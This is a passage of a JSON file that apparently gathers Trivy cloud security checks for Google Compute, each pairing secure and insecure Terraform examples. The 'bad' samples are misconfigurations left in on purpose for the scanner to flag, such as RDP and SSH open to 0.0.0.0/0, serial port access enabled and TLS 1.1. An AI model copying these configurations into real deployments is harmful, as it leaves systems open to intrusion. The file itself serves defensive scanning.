ip_cidr_range = \"10.2.0.0/16\"\n        region        = \"us-central1\"\n        network       = google_compute_network.custom-test.id\n      }\n      resource \"google_compute_network\" \"custom-test\" {\n        name                    = \"test-network\"\n        auto_create_subnetworks = false\n      }\n",
        "file_name": "enable_vpc_flow_logs.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/enable_vpc_flow_logs.yaml",
        "local_path": "google/compute/enable_vpc_flow_logs.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork#enable_flow_logs"
            ],
            "good": [
              "resource \"google_compute_subnetwork\" \"good_example\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n  log_config {\n    aggregation_interval = \"INTERVAL_10_MIN\"\n    flow_sampling        = 0.5\n    metadata             = \"INCLUDE_ALL_METADATA\"\n  }\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}",
              "resource \"google_compute_subnetwork\" \"good-example\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  purpose       = \"REGIONAL_MANAGED_PROXY\"\n  network       = google_compute_network.custom-test.id\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}"
            ],
            "bad": [
              "resource \"google_compute_subnetwork\" \"bad_example\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-NO_DEFAULT_SERVICE_ACCOUNT",
        "title": "No Default Service Account",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#\n  good:\n    - |-\n      resource \"google_service_account\" \"default\" {\n        account_id   = \"service_account_id\"\n        display_name = \"Service Account\"\n      }\n\n      resource \"google_compute_instance\" \"default\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        service_account {\n          # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n          email  = google_service_account.default.email\n          scopes = [\"cloud-platform\"]\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_instance\" \"default\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        service_account {\n          # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n          email  = \"1234567890-compute@developer.gserviceaccount.com\"\n          scopes = [\"cloud-platform\"]\n        }\n      }\n",
        "file_name": "no_default_service_account.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/no_default_service_account.yaml",
        "local_path": "google/compute/no_default_service_account.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#"
            ],
            "good": [
              "resource \"google_service_account\" \"default\" {\n  account_id   = \"service_account_id\"\n  display_name = \"Service Account\"\n}\n\nresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  service_account {\n    # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n    email  = google_service_account.default.email\n    scopes = [\"cloud-platform\"]\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  service_account {\n    # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n    email  = \"1234567890-compute@developer.gserviceaccount.com\"\n    scopes = [\"cloud-platform\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-NO_IP_FORWARDING",
        "title": "No Ip Forwarding",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#can_ip_forward\n  good:\n    - |-\n      resource \"google_compute_instance\" \"good_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        can_ip_forward = false\n      }\n  bad:\n    - |-\n      resource \"google_compute_instance\" \"bad_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        can_ip_forward = true\n      }\n",
        "file_name": "no_ip_forwarding.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/no_ip_forwarding.yaml",
        "local_path": "google/compute/no_ip_forwarding.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#can_ip_forward"
            ],
            "good": [
              "resource \"google_compute_instance\" \"good_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  can_ip_forward = false\n}"
            ],
            "bad": [
              "resource \"google_compute_instance\" \"bad_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  can_ip_forward = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-NO_OPEN_RDP_ACCESS",
        "title": "No Open Rdp Access",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#source_ranges\n    - https://www.terraform.io/docs/providers/google/r/compute_firewall.html\n  good:\n    - |-\n      resource \"google_compute_firewall\" \"good_example_restricted_source\" {\n        name          = \"allow-specific-ip\"\n        network       = google_compute_network.my_vpc.name\n        direction     = \"INGRESS\"\n        source_ranges = [\"1.2.3.4/32\"]\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"3380-3390\"]\n        }\n      }\n    - |-\n      resource \"google_compute_firewall\" \"good_example_different_port\" {\n        name          = \"allow-vms-to-some-machine\"\n        network       = google_compute_network.my_vpc.name\n        direction     = \"INGRESS\"\n        source_ranges = [\"0.0.0.0/0\"]\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"8080-8090\"]\n        }\n      }\n    - |-\n      resource \"google_compute_firewall\" \"good_example_with_tags\" {\n        name          = \"allow-tagged-vms\"\n        network       = google_compute_network.my_vpc.name\n        direction     = \"INGRESS\"\n        source_ranges = [\"0.0.0.0/0\"]\n        source_tags   = [\"vms\"]\n        target_tags   = [\"some-machine\"]\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"3380-3390\"]\n        }\n      }\n    - |-\n      resource \"google_compute_firewall\" \"good_example_different_protocol\" {\n        name          = \"allow-udp-3389\"\n        network       = google_compute_network.my_vpc.name\n        direction     = \"INGRESS\"\n        source_ranges = [\"0.0.0.0/0\"]\n        allow {\n          protocol = \"udp\"\n          ports    = [\"3380-3390\"]\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_firewall\" \"bad_example_unrestricted_tcp_3389\" {\n        name          = \"allow-all-to-rdp\"\n        network       = google_compute_network.my_vpc.name\n        direction     = \"INGRESS\"\n        source_ranges = [\"0.0.0.0/0\"]\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"3380-3390\"]\n        }\n      }\n    - |-\n      resource \"google_compute_firewall\" \"bad_example_unrestricted_port_range\" {\n        name          = \"allow-all-to-range\"\n        network       = google_compute_network.my_vpc.name\n        direction     = \"INGRESS\"\n        source_ranges = [\"0.0.0.0/0\"]\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"3300-3400\"]\n        }\n      }\n",
        "file_name": "no_open_rdp_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/no_open_rdp_access.yaml",
        "local_path": "google/compute/no_open_rdp_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#source_ranges",
              "https://www.terraform.io/docs/providers/google/r/compute_firewall.html"
            ],
            "good": [
              "resource \"google_compute_firewall\" \"good_example_restricted_source\" {\n  name          = \"allow-specific-ip\"\n  network       = google_compute_network.my_vpc.name\n  direction     = \"INGRESS\"\n  source_ranges = [\"1.2.3.4/32\"]\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"3380-3390\"]\n  }\n}",
              "resource \"google_compute_firewall\" \"good_example_different_port\" {\n  name          = \"allow-vms-to-some-machine\"\n  network       = google_compute_network.my_vpc.name\n  direction     = \"INGRESS\"\n  source_ranges = [\"0.0.0.0/0\"]\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"8080-8090\"]\n  }\n}",
              "resource \"google_compute_firewall\" \"good_example_with_tags\" {\n  name          = \"allow-tagged-vms\"\n  network       = google_compute_network.my_vpc.name\n  direction     = \"INGRESS\"\n  source_ranges = [\"0.0.0.0/0\"]\n  source_tags   = [\"vms\"]\n  target_tags   = [\"some-machine\"]\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"3380-3390\"]\n  }\n}",
              "resource \"google_compute_firewall\" \"good_example_different_protocol\" {\n  name          = \"allow-udp-3389\"\n  network       = google_compute_network.my_vpc.name\n  direction     = \"INGRESS\"\n  source_ranges = [\"0.0.0.0/0\"]\n  allow {\n    protocol = \"udp\"\n    ports    = [\"3380-3390\"]\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_firewall\" \"bad_example_unrestricted_tcp_3389\" {\n  name          = \"allow-all-to-rdp\"\n  network       = google_compute_network.my_vpc.name\n  direction     = \"INGRESS\"\n  source_ranges = [\"0.0.0.0/0\"]\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"3380-3390\"]\n  }\n}",
              "resource \"google_compute_firewall\" \"bad_example_unrestricted_port_range\" {\n  name          = \"allow-all-to-range\"\n  network       = google_compute_network.my_vpc.name\n  direction     = \"INGRESS\"\n  source_ranges = [\"0.0.0.0/0\"]\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"3300-3400\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-NO_OSLOGIN_OVERRIDE",
        "title": "No Oslogin Override",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#\n  good:\n    - |-\n      resource \"google_compute_instance\" \"default\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        metadata = {\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_instance\" \"default\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        metadata = {\n          enable-oslogin = false\n        }\n      }\n",
        "file_name": "no_oslogin_override.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/no_oslogin_override.yaml",
        "local_path": "google/compute/no_oslogin_override.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#"
            ],
            "good": [
              "resource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  metadata = {\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  metadata = {\n    enable-oslogin = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-NO_PROJECT_WIDE_SSH_KEYS",
        "title": "No Project Wide Ssh Keys",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#\n  good:\n    - |-\n      resource \"google_compute_instance\" \"default\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        metadata = {\n          block-project-ssh-keys = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_service_account\" \"default\" {\n        account_id   = \"service_account_id\"\n        display_name = \"Service Account\"\n      }\n\n      resource \"google_compute_instance\" \"default\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        metadata = {\n          block-project-ssh-keys = false\n        }\n      }\n",
        "file_name": "no_project_wide_ssh_keys.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/no_project_wide_ssh_keys.yaml",
        "local_path": "google/compute/no_project_wide_ssh_keys.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#"
            ],
            "good": [
              "resource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  metadata = {\n    block-project-ssh-keys = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_service_account\" \"default\" {\n  account_id   = \"service_account_id\"\n  display_name = \"Service Account\"\n}\n\nresource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  metadata = {\n    block-project-ssh-keys = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-NO_PUBLIC_EGRESS",
        "title": "No Public Egress",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall\n  good:\n    - |-\n      resource \"google_compute_firewall\" \"good_example\" {\n        direction = \"EGRESS\"\n        allow {\n          protocol = \"icmp\"\n        }\n        destination_ranges = [\"1.2.3.4/32\"]\n      }\n  bad:\n    - |-\n      resource \"google_compute_firewall\" \"bad_example\" {\n        direction = \"EGRESS\"\n        allow {\n          protocol = \"icmp\"\n        }\n        destination_ranges = [\"0.0.0.0/0\"]\n      }\n",
        "file_name": "no_public_egress.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/no_public_egress.yaml",
        "local_path": "google/compute/no_public_egress.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall"
            ],
            "good": [
              "resource \"google_compute_firewall\" \"good_example\" {\n  direction = \"EGRESS\"\n  allow {\n    protocol = \"icmp\"\n  }\n  destination_ranges = [\"1.2.3.4/32\"]\n}"
            ],
            "bad": [
              "resource \"google_compute_firewall\" \"bad_example\" {\n  direction = \"EGRESS\"\n  allow {\n    protocol = \"icmp\"\n  }\n  destination_ranges = [\"0.0.0.0/0\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-NO_PUBLIC_INGRESS",
        "title": "No Public Ingress",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#source_ranges\n    - https://www.terraform.io/docs/providers/google/r/compute_firewall.html\n  good:\n    - |-\n      resource \"google_compute_firewall\" \"good_example\" {\n        source_ranges = [\"1.2.3.4/32\"]\n        allow {\n          protocol = \"icmp\"\n        }\n      }\n    - |-\n      resource \"google_compute_firewall\" \"allow-vms-to-some-machine\" {\n        name      = \"allow-vms-to-some-machine\"\n        network   = local.network\n        priority  = 1300\n        direction = \"INGRESS\"\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"8081\"]\n        }\n        source_tags = [\"vms\"]\n        target_tags = [\"some-machine\"]\n      }\n    - |-\n      resource \"google_compute_firewall\" \"test\" {\n        name    = \"gmp-validating-webhook-fw\"\n        network = google_compute_network.my_vpc_name.self_link\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"8443\"]\n        }\n\n        target_tags   = [\"k8s-node-pool\"]\n        source_ranges = [google_container_cluster.my_cluster_name.private_cluster_config[0].master_ipv4_cidr_block]\n      }\n  bad:\n    - |-\n      resource \"google_compute_firewall\" \"bad_example\" {\n        source_ranges = [\"0.0.0.0/0\"]\n        allow {\n          protocol = \"icmp\"\n        }\n      }\n",
        "file_name": "no_public_ingress.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/no_public_ingress.yaml",
        "local_path": "google/compute/no_public_ingress.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall#source_ranges",
              "https://www.terraform.io/docs/providers/google/r/compute_firewall.html"
            ],
            "good": [
              "resource \"google_compute_firewall\" \"good_example\" {\n  source_ranges = [\"1.2.3.4/32\"]\n  allow {\n    protocol = \"icmp\"\n  }\n}",
              "resource \"google_compute_firewall\" \"allow-vms-to-some-machine\" {\n  name      = \"allow-vms-to-some-machine\"\n  network   = local.network\n  priority  = 1300\n  direction = \"INGRESS\"\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"8081\"]\n  }\n  source_tags = [\"vms\"]\n  target_tags = [\"some-machine\"]\n}",
              "resource \"google_compute_firewall\" \"test\" {\n  name    = \"gmp-validating-webhook-fw\"\n  network = google_compute_network.my_vpc_name.self_link\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"8443\"]\n  }\n\n  target_tags   = [\"k8s-node-pool\"]\n  source_ranges = [google_container_cluster.my_cluster_name.private_cluster_config[0].master_ipv4_cidr_block]\n}"
            ],
            "bad": [
              "resource \"google_compute_firewall\" \"bad_example\" {\n  source_ranges = [\"0.0.0.0/0\"]\n  allow {\n    protocol = \"icmp\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-NO_PUBLIC_IP",
        "title": "No Public Ip",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#access_config\n  good:\n    - |-\n      resource \"google_compute_instance\" \"good_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        network_interface {\n          network = \"default\"\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_instance\" \"bad_example\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        network_interface {\n          network = \"default\"\n\n          access_config {\n            // Ephemeral IP\n          }\n        }\n      }\n",
        "file_name": "no_public_ip.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/no_public_ip.yaml",
        "local_path": "google/compute/no_public_ip.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#access_config"
            ],
            "good": [
              "resource \"google_compute_instance\" \"good_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  network_interface {\n    network = \"default\"\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_instance\" \"bad_example\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  network_interface {\n    network = \"default\"\n\n    access_config {\n      // Ephemeral IP\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-NO_SERIAL_PORT",
        "title": "No Serial Port",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#\n  good:\n    - |-\n      resource \"google_compute_instance\" \"default\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        metadata = {\n          serial-port-enable = false\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_instance\" \"default\" {\n        name         = \"test\"\n        machine_type = \"e2-medium\"\n        zone         = \"us-central1-a\"\n\n        boot_disk {\n          initialize_params {\n            image = \"debian-cloud/debian-9\"\n          }\n        }\n\n        metadata = {\n          serial-port-enable = true\n        }\n      }\n",
        "file_name": "no_serial_port.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/no_serial_port.yaml",
        "local_path": "google/compute/no_serial_port.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#"
            ],
            "good": [
              "resource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  metadata = {\n    serial-port-enable = false\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_instance\" \"default\" {\n  name         = \"test\"\n  machine_type = \"e2-medium\"\n  zone         = \"us-central1-a\"\n\n  boot_disk {\n    initialize_params {\n      image = \"debian-cloud/debian-9\"\n    }\n  }\n\n  metadata = {\n    serial-port-enable = true\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-PROJECT_LEVEL_OSLOGIN",
        "title": "Project Level Oslogin",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_project_metadata#\n  good:\n    - |-\n      resource \"google_compute_project_metadata\" \"default\" {\n        metadata = {\n          enable-oslogin = true\n        }\n      }\n  bad:\n    - |-\n      resource \"google_compute_project_metadata\" \"default\" {\n        metadata = {\n          enable-oslogin = false\n        }\n      }\n",
        "file_name": "project_level_oslogin.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/project_level_oslogin.yaml",
        "local_path": "google/compute/project_level_oslogin.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_project_metadata#"
            ],
            "good": [
              "resource \"google_compute_project_metadata\" \"default\" {\n  metadata = {\n    enable-oslogin = true\n  }\n}"
            ],
            "bad": [
              "resource \"google_compute_project_metadata\" \"default\" {\n  metadata = {\n    enable-oslogin = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-RESTRICT_SSH_ACCESS",
        "title": "Restrict Ssh Access",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall\n  good:\n    - |-\n      resource \"google_compute_firewall\" \"good_example\" {\n        name    = \"allow-ssh-from-specific-ip\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"22\"]\n        }\n\n        source_ranges = [\"192.168.1.0/24\"]\n        target_tags   = [\"ssh-allowed\"]\n      }\n    - |-\n      resource \"google_compute_firewall\" \"allow-ssh-from-office\" {\n        name    = \"allow-ssh-from-office\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"22\"]\n        }\n\n        source_ranges = [\"203.0.113.0/24\"]\n        target_tags   = [\"web-servers\"]\n      }\n  bad:\n    - |-\n      resource \"google_compute_firewall\" \"bad_example\" {\n        name    = \"allow-ssh-from-anywhere\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"22\"]\n        }\n\n        source_ranges = [\"0.0.0.0/0\"]\n        target_tags   = [\"ssh-allowed\"]\n      }\n    - |-\n      resource \"google_compute_firewall\" \"allow-ssh-public\" {\n        name    = \"allow-ssh-public\"\n        network = \"default\"\n\n        allow {\n          protocol = \"tcp\"\n          ports    = [\"22\"]\n        }\n\n        source_ranges = [\"0.0.0.0/0\"]\n      }\n",
        "file_name": "restrict_ssh_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/restrict_ssh_access.yaml",
        "local_path": "google/compute/restrict_ssh_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_firewall"
            ],
            "good": [
              "resource \"google_compute_firewall\" \"good_example\" {\n  name    = \"allow-ssh-from-specific-ip\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\"]\n  }\n\n  source_ranges = [\"192.168.1.0/24\"]\n  target_tags   = [\"ssh-allowed\"]\n}",
              "resource \"google_compute_firewall\" \"allow-ssh-from-office\" {\n  name    = \"allow-ssh-from-office\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\"]\n  }\n\n  source_ranges = [\"203.0.113.0/24\"]\n  target_tags   = [\"web-servers\"]\n}"
            ],
            "bad": [
              "resource \"google_compute_firewall\" \"bad_example\" {\n  name    = \"allow-ssh-from-anywhere\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\"]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n  target_tags   = [\"ssh-allowed\"]\n}",
              "resource \"google_compute_firewall\" \"allow-ssh-public\" {\n  name    = \"allow-ssh-public\"\n  network = \"default\"\n\n  allow {\n    protocol = \"tcp\"\n    ports    = [\"22\"]\n  }\n\n  source_ranges = [\"0.0.0.0/0\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_ssl_policy#min_tls_version\n  good:\n    - |-\n      resource \"google_compute_ssl_policy\" \"good_example\" {\n        name            = \"production-ssl-policy\"\n        profile         = \"MODERN\"\n        min_tls_version = \"TLS_1_2\"\n      }\n  bad:\n    - |-\n      resource \"google_compute_ssl_policy\" \"bad_example\" {\n        name            = \"production-ssl-policy\"\n        profile         = \"MODERN\"\n        min_tls_version = \"TLS_1_1\"\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/google/compute/use_secure_tls_policy.yaml",
        "local_path": "google/compute/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_ssl_policy#min_tls_version"
            ],
            "good": [
              "resource \"google_compute_ssl_policy\" \"good_example\" {\n  name            = \"production-ssl-policy\"\n  profile         = \"MODERN\"\n  min_tls_version = \"TLS_1_2\"\n}"
            ],
            "bad": [
              "resource \"google_compute_ssl_policy\" \"bad_example\" {\n  name            = \"production-ssl-policy\"\n  profile         = \"MODERN\"\n  min_tls_version = \"TLS_1_1\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "GOOGLE-COMPUTE-VM_DISK_ENCRYPTION_CUSTOMER_KEY",
        "title": "Vm Disk Encryption Customer Key",
        "provider": "google",
        "service": "compute",
        "language": "terraform",
